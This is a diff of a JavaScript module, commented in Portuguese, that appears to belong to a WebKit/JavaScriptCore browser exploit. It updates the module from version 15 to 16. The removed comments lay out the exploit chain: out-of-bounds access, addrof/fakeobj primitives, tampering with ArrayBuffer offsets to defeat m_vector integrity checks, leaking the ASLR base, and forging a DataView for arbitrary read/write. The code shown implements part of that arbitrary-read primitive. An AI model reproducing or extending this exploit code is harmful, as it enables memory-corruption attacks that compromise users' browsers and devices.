@@ -1,13 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v15 - Foco no Bypass de Mitigação de m_vector)
+// js/script3/testArrayBufferVictimCrash.mjs (v16 - Fortificando Alocação OOB)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
-// 1. Validar primitivas básicas (OOB local).
-// 2. Estabilizar addrof_core/fakeobj_core.
-// 3. NOVO: Tentar manipular offsets do ArrayBuffer subjacente (0x28, 0x30, 0x34, 0x38, 0x40)
-//    para enganar as verificações de integridade durante a L/E arbitrária.
-// 4. Vazar a base ASLR da WebKit usando as primitivas addrof_core/arb_read.
-// 5. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
-// 6. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
+// FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -28,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v15 - Foco no Bypass de Mitigação de m_vector";
+export const FNAME_MODULE = "v16 - Fortificando Alocacao OOB"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -41,6 +35,7 @@ const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)
 
 let global_spray_objects = [];
 let hold_objects = [];
+let oob_allocation_refs = []; // Nova variável para segurar referências a alocações OOB
 
 let _fake_data_view = null;
 
@@ -84,9 +79,6 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
-    // O m_vector do *DataView forjado* é que será manipulado aqui.
-    // O DataView forjado (_fake_data_view) é, na verdade, um ArrayBuffer que foi type-confused.
-    // O JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET aponta para o m_vector dentro desse ArrayBuffer.
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
